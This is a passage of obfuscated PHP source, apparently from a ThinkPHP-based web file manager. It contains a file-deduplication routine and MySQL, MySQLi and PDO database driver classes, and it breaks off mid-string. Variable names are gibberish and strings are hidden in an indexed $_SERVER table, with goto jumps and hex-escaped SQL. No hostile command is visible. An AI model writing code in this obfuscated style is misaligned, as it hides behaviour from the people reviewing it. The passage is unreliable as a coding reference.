$½É—©¼¸); if ($ãôŠ¢«ä[$±¿‹æ‘[33]] == $±¿‹æ‘[78]) { $ãôŠ¢«ä[$±¿‹æ‘[87]] = $„üÛæÈë->getPathInner($ãôŠ¢«ä[$±¿‹æ‘[87]]); $this->_copyChildTo($„üÛæÈë, $ãôŠ¢«ä[$±¿‹æ‘[87]], $É‘Æ¢êÉ, $„«ß·“, $½É—©¼¸, $Ü„—àÎ); } } } private function _addFiles($¡¹ŒÎ£ó, $šÖ·ØÈä, $¬î¢§) { $Ú¤Õàá” =& $_SERVER[´È¥ö†ö]; if (!$šÖ·ØÈä || count($šÖ·ØÈä) == 0) { return array(); } $°âÌòƒö = array(); foreach ($šÖ·ØÈä as &$‡ƒÊ§Ùö) { Hook::trigger($Ú¤Õàá”[685], $‡ƒÊ§Ùö); $‡ƒÊ§Ùö[$Ú¤Õàá”[87]] = $¡¹ŒÎ£ó->getPathInner($‡ƒÊ§Ùö[$Ú¤Õàá”[87]]); $ËÒ¨¹çÄ = $¡¹ŒÎ£ó->hashSimple($‡ƒÊ§Ùö[$Ú¤Õàá”[87]]); $ò×ìÛèÍ = $¡¹ŒÎ£ó->hashMd5($‡ƒÊ§Ùö[$Ú¤Õàá”[87]]); if (strlen($ò×ìÛèÍ) > 10 && !isset($°âÌòƒö[$ò×ìÛèÍ])) { $°âÌòƒö[$ò×ìÛèÍ] = array(); } $‡ƒÊ§Ùö[$Ú¤Õàá”[686]] = $ËÒ¨¹çÄ; $‡ƒÊ§Ùö[$Ú¤Õàá”[558]] = $ò×ìÛèÍ; $°âÌòƒö[$ò×ìÛèÍ][] =& $‡ƒÊ§Ùö; if (count($°âÌòƒö[$ò×ìÛèÍ]) > 1) { $‡ƒÊ§Ùö[$Ú¤Õàá”[684]] = !0; } Hook::trigger($Ú¤Õàá”[687], $‡ƒÊ§Ùö); } unset($‡ƒÊ§Ùö); $ì¸áØ† = array($Ú¤Õàá”[558] => array($Ú¤Õàá”[7], array_keys($°âÌòƒö))); $€¬ï öã = Model($Ú¤Õàá”[688]); $»ÎËä‚º = $€¬ï öã->where($ì¸áØ†)->select(); $»ÎËä‚º = $»ÎËä‚º ? $»ÎËä‚º : array(); foreach ($»ÎËä‚º as $ÄøŒ»¹¬) { if (!isset($°âÌòƒö[$ÄøŒ»¹¬[$Ú¤Õàá”[558]]])) { continue; } $à¤¡Ã²é = $°âÌòƒö[$ÄøŒ»¹¬[$Ú¤Õàá”[558]]]; foreach ($à¤¡Ã²é as &$‡ƒÊ§Ùö) { $‡ƒÊ§Ùö[$Ú¤Õàá”[552]] = $ÄøŒ»¹¬[$Ú¤Õàá”[552]]; $‡ƒÊ§Ùö[$Ú¤Õàá”[684]] = !0; } unset($‡ƒÊ§Ùö); } $Á†àãºê = array(); foreach ($šÖ·ØÈä as $Ë¼ğ ùü) { Hook::trigger($Ú¤Õàá”[689], $Ë¼ğ ùü); if (isset($Ë¼ğ ùü[$Ú¤Õàá”[684]]) && $Ë¼ğ ùü[$Ú¤Õàá”[684]]) { Hook::trigger($Ú¤Õàá”[690], $Ë¼ğ ùü); continue; } $€²¦ÏŸ = $¡¹ŒÎ£ó->getPathInner($Ë¼ğ ùü[$Ú¤Õàá”[87]]); $Ö™Üï‰İ = $€¬ï öã->addFileMake($€²¦ÏŸ, $Ë¼ğ ùü[$Ú¤Õàá”[79]], $Ë¼ğ ùü[$Ú¤Õàá”[686]], $Ë¼ğ ùü[$Ú¤Õàá”[558]], $Ë¼ğ ùü[$Ú¤Õàá”[32]], $¬î¢§); Hook::trigger($Ú¤Õàá”[690], $Ë¼ğ ùü); if (!is_array($Ö™Üï‰İ)) { continue; } $Á†àãºê[] = $Ö™Üï‰İ; } $€¬ï öã->addAll($Á†àãºê); $ì¸áØ† = array($Ú¤Õàá”[558] => array($Ú¤Õàá”[7], array_keys($°âÌòƒö))); $»ÎËä‚º = $€¬ï öã->where($ì¸áØ†)->select(); $»ÎËä‚º = $»ÎËä‚º ? $»ÎËä‚º : array(); foreach ($»ÎËä‚º as $ÄøŒ»¹¬) { if (!isset($°âÌòƒö[$ÄøŒ»¹¬[$Ú¤Õàá”[558]]])) { continue; } $Ë–¡‚œ¦ =& $°âÌòƒö[$ÄøŒ»¹¬[$Ú¤Õàá”[558]]]; foreach ($Ë–¡‚œ¦ as &$‡ƒÊ§Ùö) { $‡ƒÊ§Ùö[$Ú¤Õàá”[552]] = $ÄøŒ»¹¬[$Ú¤Õàá”[552]]; } unset($‡ƒÊ§Ùö); } $œ˜œæƒ = array(); foreach ($šÖ·ØÈä as $Îà†£») { $œ˜œæƒ[$Îà†£»[$Ú¤Õàá”[32]]] = $Îà†£»; } return $œ˜œæƒ; } } define($_SERVER[´È¥ö†ö][691], $_SERVER[´È¥ö†ö][692]); $ualwxzctvb = $_SERVER[´È¥ö†ö][693]; goto DÌ›¯Ñ¢´¤; e©¦«â²„à: class DbMysql extends Db { public function __construct($‚Åô±Ë‰ = '') { $Ôê¯»Ô´ =& $_SERVER[´È¥ö†ö]; if (!extension_loaded($Ôê¯»Ô´[881])) { think_exception(think_lang($Ôê¯»Ô´[14]) . $Ôê¯»Ô´[961]); } if (!empty($‚Åô±Ë‰)) { $this->config = $‚Åô±Ë‰; if (empty($this->config[$Ôê¯»Ô´[17]])) { $this->config[$Ôê¯»Ô´[17]] = $Ôê¯»Ô´[12]; } } } public function connect($õ¡¬³’ì = '', $‚­ëÕ‘š = 0, $§­´’ó = false) { $Ôâ²ÄÙé =& $_SERVER[´È¥ö†ö]; if (!isset($this->linkID[$‚­ëÕ‘š])) { if (empty($õ¡¬³’ì)) { $õ¡¬³’ì = $this->config; } $û‡‚½Ü = $õ¡¬³’ì[$Ôâ²ÄÙé[962]] . ($õ¡¬³’ì[$Ôâ²ÄÙé[963]] ? "\72{$õ¡¬³’ì[$Ôâ²ÄÙé[963]]}" : $Ôâ²ÄÙé[12]); $ÉÅ¥Â©¹ = !empty($õ¡¬³’ì[$Ôâ²ÄÙé[17]][$Ôâ²ÄÙé[18]]) ? $õ¡¬³’ì[$Ôâ²ÄÙé[17]][$Ôâ²ÄÙé[18]] : $this->pconnect; if ($ÉÅ¥Â©¹) { $this->linkID[$‚­ëÕ‘š] = mysql_pconnect($û‡‚½Ü, $õ¡¬³’ì[$Ôâ²ÄÙé[964]], $õ¡¬³’ì[$Ôâ²ÄÙé[965]], 131072); } else { $this->linkID[$‚­ëÕ‘š] = mysql_connect($û‡‚½Ü, $õ¡¬³’ì[$Ôâ²ÄÙé[964]], $õ¡¬³’ì[$Ôâ²ÄÙé[965]], !0, 131072); } if (!$this->linkID[$‚­ëÕ‘š] || !empty($õ¡¬³’ì[$Ôâ²ÄÙé[21]]) && !mysql_select_db($õ¡¬³’ì[$Ôâ²ÄÙé[21]], $this->linkID[$‚­ëÕ‘š])) { think_exception(mysql_error()); } $½Å‘ì®ş = mysql_get_server_info($this->linkID[$‚­ëÕ‘š]); mysql_query($Ôâ²ÄÙé[966] . think_config($Ôâ²ÄÙé[967]) . $Ôâ²ÄÙé[58], $this->linkID[$‚­ëÕ‘š]); if ($½Å‘ì®ş > $Ôâ²ÄÙé[968]) { mysql_query($Ôâ²ÄÙé[969], $this->linkID[$‚­ëÕ‘š]); } $this->connected = !0; if (1 != think_config($Ôâ²ÄÙé[22])) { unset($this->config); } } return $this->linkID[$‚­ëÕ‘š]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÍõÌ÷´ó) { $Õ²¯ò°Ş =& $_SERVER[´È¥ö†ö]; if (0 === stripos($ÍõÌ÷´ó, $Õ²¯ò°Ş[352])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÍõÌ÷´ó; if ($this->queryID) { $this->free(); } think_action_status($Õ²¯ò°Ş[23], 1); think_status($Õ²¯ò°Ş[24]); $this->queryID = mysql_query($ÍõÌ÷´ó, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($½´Õ¸ò„) { $† ıÈ­£ =& $_SERVER[´È¥ö†ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $½´Õ¸ò„; if ($this->queryID) { $this->free(); } think_action_status($† ıÈ­£[25], 1); think_status($† ıÈ­£[24]); $½ä‘ÃçÈ = mysql_query($½´Õ¸ò„, $this->_linkID); $this->debug(); if (!1 === $½ä‘ÃçÈ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[´È¥ö†ö][970], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÂÒ®Àìş = mysql_query($_SERVER[´È¥ö†ö][971], $this->_linkID); $this->transTimes = 0; if (!$ÂÒ®Àìş) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¶à‹±Ò = mysql_query($_SERVER[´È¥ö†ö][972], $this->_linkID); $this->transTimes = 0; if (!$¶à‹±Ò) { $this->error(); return !1; } } return !0; } private function getAll() { $Ş—†ş†¿ = array(); if ($this->numRows > 0) { while ($•’–‘· = mysql_fetch_assoc($this->queryID)) { $Ş—†ş†¿[] = $•’–‘·; } mysql_data_seek($this->queryID, 0); } return $Ş—†ş†¿; } public function getFields($›Ì«òÛ™) { $•Í•ºÑ =& $_SERVER[´È¥ö†ö]; $£´ú°ˆê = $this->query($•Í•ºÑ[973] . $this->parseKey($›Ì«òÛ™)); $­æ§Ë‡ë = array(); if ($£´ú°ˆê) { foreach ($£´ú°ˆê as $Áõû³€Ò => $ÒâÜ ²Ù) { $­æ§Ë‡ë[$ÒâÜ ²Ù[$•Í•ºÑ[31]]] = array($•Í•ºÑ[32] => $ÒâÜ ²Ù[$•Í•ºÑ[31]], $•Í•ºÑ[33] => $ÒâÜ ²Ù[$•Í•ºÑ[34]], $•Í•ºÑ[35] => (bool) (strtoupper($ÒâÜ ²Ù[$•Í•ºÑ[36]]) === $•Í•ºÑ[974]), $•Í•ºÑ[37] => $ÒâÜ ²Ù[$•Í•ºÑ[38]], $•Í•ºÑ[39] => strtolower($ÒâÜ ²Ù[$•Í•ºÑ[40]]) == $•Í•ºÑ[41], $•Í•ºÑ[42] => strtolower($ÒâÜ ²Ù[$•Í•ºÑ[43]]) == $•Í•ºÑ[44]); } } return $­æ§Ë‡ë; } public function getTables($ÒÑÜÃë = '') { $ş¹˜¿üë =& $_SERVER[´È¥ö†ö]; if (!empty($ÒÑÜÃë)) { $õöÓîÇ = $ş¹˜¿üë[975] . $ÒÑÜÃë . $ş¹˜¿üë[976]; } else { $õöÓîÇ = $ş¹˜¿üë[977]; } $ëÖÑÔ°Ø = $this->query($õöÓîÇ); $ñ£Œƒà’ = array(); foreach ($ëÖÑÔ°Ø as $ô¾†ßÕÉ => $Æ¬éıÖ) { $ñ£Œƒà’[$ô¾†ßÕÉ] = current($Æ¬éıÖ); } return $ñ£Œƒà’; } public function replace($ŞŠÙå±Ê, $…åê¦ÚÔ = array()) { $ŸÂ…İ›ø =& $_SERVER[´È¥ö†ö]; foreach ($ŞŠÙå±Ê as $œò¥£·Ó => $‚¶“–•°) { $‹£Á¾ = $this->parseValue($‚¶“–•°); if (is_scalar($‹£Á¾)) { $ıøĞÇ„[] = $‹£Á¾; $ş¬“‰˜À[] = $this->parseKey($œò¥£·Ó); } } $¿É”¼® = $ŸÂ…İ›ø[978] . $this->parseTable($…åê¦ÚÔ[$ŸÂ…İ›ø[367]]) . $ŸÂ…İ›ø[979] . implode($ŸÂ…İ›ø[50], $ş¬“‰˜À) . $ŸÂ…İ›ø[980] . implode($ŸÂ…İ›ø[50], $ıøĞÇ„) . $ŸÂ…İ›ø[981]; return $this->execute($¿É”¼®); } public function insertAll($ñéñ°¡, $¯ñ©ÃÅÅ = array(), $ÄŠ€ÆÂø = false) { $àƒÀ€÷ =& $_SERVER[´È¥ö†ö]; if (!is_array($ñéñ°¡[0])) { return !1; } $ìï½ç‘Æ = array_keys($ñéñ°¡[0]); $ÛÙù”˜æ = array(); foreach ($ñéñ°¡ as $ãİã ­í) { $÷æáìåõ = array(); foreach ($ãİã ­í as $”‰„†ûá => $ùÆ•È) { $ùÆ•È = $this->parseValue($ùÆ•È); if (is_scalar($ùÆ•È)) { $÷æáìåõ[] = $ùÆ•È; } } $ÛÙù”˜æ[] = $àƒÀ€÷[348] . implode($àƒÀ€÷[50], $÷æáìåõ) . $àƒÀ€÷[981]; } array_walk($ìï½ç‘Æ, array($this, $àƒÀ€÷[982])); $ù³Üûµ = ($ÄŠ€ÆÂø ? $àƒÀ€÷[983] : $àƒÀ€÷[984]) . $àƒÀ€÷[985] . $this->parseTable($¯ñ©ÃÅÅ[$àƒÀ€÷[367]]) . $àƒÀ€÷[979] . implode($àƒÀ€÷[50], $ìï½ç‘Æ) . $àƒÀ€÷[986] . implode($àƒÀ€÷[50], $ÛÙù”˜æ); return $this->execute($ù³Üûµ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ğçî¾šú =& $_SERVER[´È¥ö†ö]; $this->error = mysql_errno() . $Ğçî¾šú[4] . mysql_error($this->_linkID); if ($Ğçî¾šú[12] != $this->queryStr) { $this->error .= LNG($Ğçî¾šú[48]) . $this->queryStr; } think_trace($this->error, $Ğçî¾šú[12], $Ğçî¾šú[49]); return $this->error; } public function escapeString($œ½‹½Ÿ´) { if ($this->_linkID) { return mysql_real_escape_string($œ½‹½Ÿ´, $this->_linkID); } else { return mysql_escape_string($œ½‹½Ÿ´); } } public function parseKey(&$üÌçÉÃ­, $áºø©ˆê = true) { $¤ıïÅà© =& $_SERVER[´È¥ö†ö]; if ($áºø©ˆê) { $üÌçÉÃ­ = $this->parseKeyCheck($üÌçÉÃ­); } if ($üÌçÉÃ­ != $¤ıïÅà©[222] && !preg_match($¤ıïÅà©[987], $üÌçÉÃ­)) { $üÌçÉÃ­ = $¤ıïÅà©[472] . trim($üÌçÉÃ­, $¤ıïÅà©[472]) . $¤ıïÅà©[472]; } return $üÌçÉÃ­; } } class DbMysqli extends Db { public function __construct($õˆç†Ğì = '') { $Ú¹óØĞÔ =& $_SERVER[´È¥ö†ö]; if (!extension_loaded($Ú¹óØĞÔ[988])) { think_exception(think_lang($Ú¹óØĞÔ[14]) . $Ú¹óØĞÔ[989]); } if (!empty($õˆç†Ğì)) { $this->config = $õˆç†Ğì; if (empty($this->config[$Ú¹óØĞÔ[17]])) { $this->config[$Ú¹óØĞÔ[17]] = $Ú¹óØĞÔ[12]; } } } public function connect($„¡Õ¼µ = '', $¢ĞÁš°£ = 0) { $¬Êæ‹Š‡ =& $_SERVER[´È¥ö†ö]; if (!isset($this->linkID[$¢ĞÁš°£])) { if (empty($„¡Õ¼µ)) { $„¡Õ¼µ = $this->config; } $this->linkID[$¢ĞÁš°£] = new mysqli($„¡Õ¼µ[$¬Êæ‹Š‡[962]], $„¡Õ¼µ[$¬Êæ‹Š‡[964]], $„¡Õ¼µ[$¬Êæ‹Š‡[965]], $„¡Õ¼µ[$¬Êæ‹Š‡[21]], $„¡Õ¼µ[$¬Êæ‹Š‡[963]] ? intval($„¡Õ¼µ[$¬Êæ‹Š‡[963]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¾éôÒ³ = $this->linkID[$¢ĞÁš°£]->server_version; $this->linkID[$¢ĞÁš°£]->query($¬Êæ‹Š‡[966] . think_config($¬Êæ‹Š‡[967]) . $¬Êæ‹Š‡[58]); if ($¾éôÒ³ > $¬Êæ‹Š‡[968]) { $this->linkID[$¢ĞÁš°£]->query($¬Êæ‹Š‡[969]); } $this->connected = !0; if (1 != think_config($¬Êæ‹Š‡[22])) { unset($this->config); } } return $this->linkID[$¢ĞÁš°£]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¢ŠüŸÅñ) { $ğŸñÏ» =& $_SERVER[´È¥ö†ö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¢ŠüŸÅñ; if ($this->queryID) { $this->free(); } think_action_status($ğŸñÏ»[23], 1); think_status($ğŸñÏ»[24]); $this->queryID = $this->_linkID->query($¢ŠüŸÅñ); if ($this->_linkID->more_results()) { while (($æ¼šİÆ = $this->_linkID->next_result()) != NULL) { $æ¼šİÆ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÈÑæİïÙ) { $š½¯¢²£ =& $_SERVER[´È¥ö†ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÈÑæİïÙ; if ($this->queryID) { $this->free(); } think_action_status($š½¯¢²£[25], 1); think_status($š½¯¢²£[24]); $È¾÷ûŠ = $this->_linkID->query($ÈÑæİïÙ); $this->debug(); if (!1 === $È¾÷ûŠ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ø«—Õì“ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ø«—Õì“) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $âç‹Î˜Ê = $this->_linkID->rollback(); $this->transTimes = 0; if (!$âç‹Î˜Ê) { $this->error(); return !1; } } return !0; } private function getAll() { $Ãıëß–ö = array(); if ($this->numRows > 0) { for ($øÏ…ÎÃ = 0; $øÏ…ÎÃ < $this->numRows; $øÏ…ÎÃ++) { $Ãıëß–ö[$øÏ…ÎÃ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Ãıëß–ö; } public function getFields($šØ‹†–) { $ó‹ö›¤ =& $_SERVER[´È¥ö†ö]; $›É¯º´÷ = $this->query($ó‹ö›¤[973] . $this->parseKey($šØ‹†–)); $°ÊÚş¤ = array(); if ($›É¯º´÷) { foreach ($›É¯º´÷ as $¾ûƒ¯ºÛ => $æşè¯àÀ) { $°ÊÚş¤[$æşè¯àÀ[$ó‹ö›¤[31]]] = array($ó‹ö›¤[32] => $æşè¯àÀ[$ó‹ö›¤[31]], $ó‹ö›¤[33] => $æşè¯àÀ[$ó‹ö›¤[34]], $ó‹ö›¤[35] => (bool) ($æşè¯àÀ[$ó‹ö›¤[36]] === $ó‹ö›¤[12]), $ó‹ö›¤[37] => $æşè¯àÀ[$ó‹ö›¤[38]], $ó‹ö›¤[39] => strtolower($æşè¯àÀ[$ó‹ö›¤[40]]) == $ó‹ö›¤[41], $ó‹ö›¤[42] => strtolower($æşè¯àÀ[$ó‹ö›¤[43]]) == $ó‹ö›¤[44]); } } return $°ÊÚş¤; } public function getTables($‰ãÀˆÈ° = '') { $—€Ş½š£ =& $_SERVER[´È¥ö†ö]; $ÀÆ Í¨ = !empty($‰ãÀˆÈ°) ? $—€Ş½š£[975] . $‰ãÀˆÈ° . $—€Ş½š£[976] : $—€Ş½š£[977]; $ÆáÑèşË = $this->query($ÀÆ Í¨); $”Ë•°Ú = array(); if ($ÆáÑèşË) { foreach ($ÆáÑèşË as $–Ç‘”¼Å => $ıé“ÙØ¤) { $”Ë•°Ú[$–Ç‘”¼Å] = current($ıé“ÙØ¤); } } return $”Ë•°Ú; } public function replace($Ú¨ÙìÂÂ, $ıå–êç = array()) { $¸ÔÉ’ßŞ =& $_SERVER[´È¥ö†ö]; foreach ($Ú¨ÙìÂÂ as $Ş‰–»â‹ => $å‘éä¡) { $Ü‰‰†Ë = $this->parseValue($å‘éä¡); if (is_scalar($Ü‰‰†Ë)) { $…¾œ£Ë—[] = $Ü‰‰†Ë; $…°åÎä´[] = $this->parseKey($Ş‰–»â‹); } } $‘è¶Ù™­ = $¸ÔÉ’ßŞ[978] . $this->parseTable($ıå–êç[$¸ÔÉ’ßŞ[367]]) . $¸ÔÉ’ßŞ[979] . implode($¸ÔÉ’ßŞ[50], $…°åÎä´) . $¸ÔÉ’ßŞ[980] . implode($¸ÔÉ’ßŞ[50], $…¾œ£Ë—) . $¸ÔÉ’ßŞ[981]; return $this->execute($‘è¶Ù™­); } public function insertAll($Èµù‹ó¿, $‡œÈ¿†œ = array(), $´õ´¢“Ÿ = false) { $áãóÃÎğ =& $_SERVER[´È¥ö†ö]; if (!is_array($Èµù‹ó¿[0])) { return !1; } $ÖºöÇÓÉ = array_keys($Èµù‹ó¿[0]); $€Ïêàâ² = array(); foreach ($Èµù‹ó¿ as $íßøÊÛ») { $öÑŸ…ƒŠ = array(); foreach ($íßøÊÛ» as $ßóÖ›œ => $’¥Ïí) { $’¥Ïí = $this->parseValue($’¥Ïí); if (is_scalar($’¥Ïí)) { $öÑŸ…ƒŠ[] = $’¥Ïí; } } $€Ïêàâ²[] = $áãóÃÎğ[348] . implode($áãóÃÎğ[50], $öÑŸ…ƒŠ) . $áãóÃÎğ[981]; } array_walk($ÖºöÇÓÉ, array($this, $áãóÃÎğ[982])); $Éˆíûˆ = $´õ´¢“Ÿ ? $áãóÃÎğ[983] : $áãóÃÎğ[984]; $ …‚™¦à = $Éˆíûˆ . $áãóÃÎğ[985] . $this->parseTable($‡œÈ¿†œ[$áãóÃÎğ[367]]) . $áãóÃÎğ[979] . implode($áãóÃÎğ[50], $ÖºöÇÓÉ) . $áãóÃÎğ[986] . implode($áãóÃÎğ[50], $€Ïêàâ²); return $this->execute($ …‚™¦à); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $øÔ¨ÏÚ  =& $_SERVER[´È¥ö†ö]; $this->error = $this->_linkID->errno . $øÔ¨ÏÚ [4] . $this->_linkID->error; if ($øÔ¨ÏÚ [12] != $this->queryStr) { $this->error .= LNG($øÔ¨ÏÚ [48]) . $this->queryStr; } think_trace($this->error, $øÔ¨ÏÚ [12], $øÔ¨ÏÚ [49]); return $this->error; } public function escapeString($¸¦—¢Ğ£) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¸¦—¢Ğ£); } else { return addslashes($¸¦—¢Ğ£); } } public function parseKey(&$Ú¡¦°Ü, $œÑ®ü³Ò = true) { $í®«¥„¸ =& $_SERVER[´È¥ö†ö]; if ($œÑ®ü³Ò) { $Ú¡¦°Ü = $this->parseKeyCheck($Ú¡¦°Ü); } if ($Ú¡¦°Ü != $í®«¥„¸[222] && !preg_match($í®«¥„¸[987], $Ú¡¦°Ü)) { $Ú¡¦°Ü = $í®«¥„¸[472] . trim($Ú¡¦°Ü, $í®«¥„¸[472]) . $í®«¥„¸[472]; } return $Ú¡¦°Ü; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($»Òì¨ğ– = '') { $Åß—ƒ° =& $_SERVER[´È¥ö†ö]; if (!class_exists($Åß—ƒ°[990])) { think_exception(think_lang($Åß—ƒ°[14]) . $Åß—ƒ°[991]); } if (!empty($»Òì¨ğ–)) { $this->config = $»Òì¨ğ–; if (empty($this->config[$Åß—ƒ°[17]])) { $this->config[$Åß—ƒ°[17]] = array(); } } } public function connect($¾¬ÔïÀØ = '', $Õ‘ôù”• = 0) { $ÍÀ©·Ò =& $_SERVER[´È¥ö†ö]; if (!isset($this->linkID[$Õ‘ôù”•])) { if (empty($¾¬ÔïÀØ)) { $¾¬ÔïÀØ = $this->config; } $‹Ó‡ö® = !empty($¾¬ÔïÀØ[$ÍÀ©·Ò[17]][$ÍÀ©·Ò[18]]) ? $¾¬ÔïÀØ[$ÍÀ©·Ò[17]][$ÍÀ©·Ò[18]] : $this->pconnect; if ($‹Ó‡ö®) { $¾¬ÔïÀØ[$ÍÀ©·Ò[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Õ‘ôù”•] = new PDO($¾¬ÔïÀØ[$ÍÀ©·Ò[992]], $¾¬ÔïÀØ[$ÍÀ©·Ò[964]], $¾¬ÔïÀØ[$ÍÀ©·Ò[965]], $¾¬ÔïÀØ[$ÍÀ©·Ò[17]]); } catch (PDOException $ÎÆÏÂ) { think_exception($ÎÆÏÂ->getMessage()); } $this->dbType = $this->_getDsnType($¾¬ÔïÀØ[$ÍÀ©·Ò[992]]); if (in_array($this->dbType, array($ÍÀ©·Ò[993], $ÍÀ©·Ò[994], $ÍÀ©·Ò[995], $ÍÀ©·Ò[996]))) { think_exception($ÍÀ©·Ò[997] . $this->dbType . $ÍÀ©·Ò[998] . $this->dbType . $ÍÀ©·Ò[999]); } if (!$this->linkID[$Õ‘ôù”•]) { think_exception($ÍÀ©·Ò[1000]); } try { $this->linkID[$Õ‘ôù”•]->exec($ÍÀ©·Ò[1001] . think_config($ÍÀ©·Ò[967])); } catch (Exception $ÎÆÏÂ) { } $this->connected = !0; if (1 != think_config($ÍÀ©·Ò[22])) { unset($this->config); } } return $this->linkID[$Õ‘ôù”•]; } public function free() { $this->PDOStatement = null; } public function query($‚‡¹—ñã, $£ğş›ˆ’ = array()) { $ß‘Îè‡£ =& $_SERVER[´È¥ö†ö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‚‡¹—ñã; if (!empty($£ğş›ˆ’)) { $this->queryStr .= $ß‘Îè‡£[1002] . print_r($£ğş›ˆ’, !0) . $ß‘Îè‡£[1003]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ß‘Îè‡£[23], 1); think_status($ß‘Îè‡£[24]); $this->PDOStatement = $this->_linkID->prepare($‚‡¹—ñã); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¦ÑÃ… = $this->PDOStatement->execute($£ğş›ˆ’); $this->debug(); if (!1 === $¦ÑÃ…) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($µ˜…Åâ¯, $éášÔÑ = array()) { $çŸ¡Õ“¶ =& $_SERVER[´È¥ö†ö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $µ˜…Åâ¯; if (!empty($éášÔÑ)) { $this->queryStr .= $çŸ¡Õ“¶[1002] . print_r($éášÔÑ, !0) . $çŸ¡Õ“¶[1003]; } $Ÿ³…Üš£ = !1; if ($this->dbType == $çŸ¡Õ“¶[996]) { if (preg_match($çŸ¡Õ“¶[1004], $this->queryStr, $óşÈ›®ø)) { $this->table = think_config($çŸ¡Õ“¶[1005]) . str_ireplace(think_config($çŸ¡Õ“¶[1006]), $çŸ¡Õ“¶[465], $óşÈ›®ø[2]); $Ÿ³…Üš£ = (bool) $this->query($çŸ¡Õ“¶[1007] . strtoupper($this->table) . $çŸ¡Õ“¶[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($çŸ¡Õ“¶[25], 1); think_status($çŸ¡Õ“¶[24]); $this->PDOStatement = $this->_linkID->prepare($µ˜…Åâ¯); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ã¯£Á¸„ = $this->PDOStatement->execute($éášÔÑ); $this->debug(); if (!1 === $ã¯£Á¸„) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Ÿ³…Üš£ || preg_match($çŸ¡Õ“¶[1008], $µ˜…Åâ¯)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $íÙÉ·ıÛ = $this->_linkID->commit(); $this->transTimes = 0; if (!$íÙÉ·ıÛ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¶¸‘ïÎì = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¶¸‘ïÎì) { $this->error(); return !1; } } return !0; } private function getAll() { $µü¡Ãš• = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($µü¡Ãš•); return $µü¡Ãš•; } public function getFields($¸¾®ıµ§) { $¯¤ÚçÍÔ =& $_SERVER[´È¥ö†ö]; $this->initConnect(!0); if (think_config($¯¤ÚçÍÔ[1009])) { $‹í¤÷åì = str_replace($¯¤ÚçÍÔ[1010], $¸¾®ıµ§, think_config($¯¤ÚçÍÔ[1009])); } else { switch ($this->dbType) { case $¯¤ÚçÍÔ[993]: case $¯¤ÚçÍÔ[1011]: $‹í¤÷åì = "\x53\105\114\x45\x43\x54\40\x20\x20\143\157\154\165\155\x6e\x5f\x6e\141\155\x65\x20\x61\x73\x20\x27\116\141\155\x65\x27\x2c\40\40\x20\144\141\164\141\x5f\164\x79\160\x65\x20\141\x73\x20\47\x54\171\160\145\x27\54\40\x20\40\143\x6f\154\165\x6d\156\137\x64\145\146\x61\x75\x6c\x74\40\141\163\x20\47\x44\145\146\x61\x75\x6c\x74\47\54\40\x20\x20\x69\x73\137\x6e\165\x6c\154\x61\x62\154\145\x20\141\x73\40\x27\116\x75\154\154\x27\12\11\11\106\x52\117\115\x9\x69\156\146\x6f\x72\155\x61\x74\151\x6f\x6e\137\163\x63\x68\145\x6d\141\56\x74\x61\142\x6c\x65\x73\40\101\x53\40\164\xa\11\x9\x4a\x4f\111\x4e\x9\x69\x6e\x66\x6f\x72\155\x61\164\x69\x6f\x6e\x5f\163\143\150\x65\155\x61\56\x63\157\154\x75\x6d\x6e\x73\x20\101\x53\x20\x63\xa\11\x9\117\x4e\40\x20\164\56\x74\x61\x62\x6c\145\137\x63\141\164\141\x6c\157\147\x20\75\x20\143\x2e\x74\x61\142\